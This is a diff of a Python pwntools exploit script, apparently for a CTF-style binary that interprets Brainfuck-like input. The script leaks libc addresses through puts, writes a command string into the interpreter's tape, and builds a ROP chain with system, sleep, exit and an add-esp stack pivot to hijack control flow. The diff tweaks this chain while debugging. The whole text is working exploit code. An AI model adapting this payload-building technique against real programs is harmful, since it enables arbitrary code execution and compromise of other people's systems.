@@ -20,7 +20,6 @@ libc = ELF("./libc.so.6")
 #libc_base = 0xf7df8000 # The original base
 #libc_base = 0xf7e0a000 # TODO - re-adjust base - I changed it cuz of gdb
 #libc.address = libc_base
-puts_addr = p32(next(libc.search(b"puts")))
 #execve_addr = p32(next(libc.search(b"libc_system")))
 
 #print(f"DUMP: {my_rop.dump()}")
@@ -37,6 +36,7 @@ with open("payload", "w") as f:
 # 1st part - before the input - just the commands
 #sh_addr = system_addr + 0x120d7b
 
+tape_addr = 0x0804a0a0 # tape is our heap var with command string
 #exit() then our execve() fork process will die
 arbitrary_bash_addr = 0xffffcc0c
 new_esp_val = 0x12345678
@@ -55,7 +55,7 @@ payload += b"<<<" # leak the address of puts
 payload += b">" * 24 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b",>,>,>," # getchar - for getting the last char
 payload += b">" * 109 # move to tape addr
-payload += b"[" # write command ls -l into tape
+payload += p32(tape_addr)
 payload += b",>,>,>," # write command ls -l into tape
 payload += b"<" * 112 # write command ls -l into tape
 payload += b"." # trigger char
@@ -104,22 +104,25 @@ memset_addr_in_main = 0x8048700
 pop_ebx = libc_base
 # 2nd program iteration - 1st half
 null_addr = 0x804b20c
-tape_addr = 0x0804a0a0 # tape is our heap var with command string
 payload = p32(memset_addr_in_main)
 #payload += p32(system_addr)
 #payload += p32(tape_addr)
 #payload += p32(pop_ebx)
-payload += b"date"
+#payload += b"date"
+payload += p32(10)
 payload += p32(0x22222222)
 payload += p32(0x33333333)
 payload += p32(0x44444444)
-payload += p32(system_addr)
+#payload += p32(system_addr)
+test_addr = 0x80486E8 # prints welcome
+sleep_addr = libc.symbols['sleep']
+payload += p32(sleep_addr)
+payload += p32(0x804a02d) # contains 0x6 for sleep
 main_ret_addr = 0x804878E
 exit_addr = libc.symbols['exit']
 print(f"exit: {hex(exit_addr)}")
-payload += p32(exit_addr) # program will jump here
-payload += p32(0x11111111)
 payload += p32(tape_addr)
+payload += p32(test_addr) # program will jump here
 #payload += p32(null_addr)
 #payload += p32(null_addr)
 #payload += p32(0x55555555)
@@ -134,7 +137,6 @@ with open("payload", "ab+") as f:
     f.write(payload)
 
 # 2nd program iteration - 2nd half
-add_esp = libc_base + 0x0005b980 # pop ecx pop edx-1st pop to get rid of [ str
 add_esp = libc_base + 0x000bd5da # stack has changed
 print(f"add esp addr: {hex(add_esp)}")
 payload = p32(add_esp) # the ADD ESP ROP address
@@ -149,4 +151,6 @@ with open("payload", "ab+") as f:
     f.write(payload)
 
 print(payload)
+print(f"WRD: {conn.recvline()}")
+print(f"WRD: {conn.recvline()}")
 
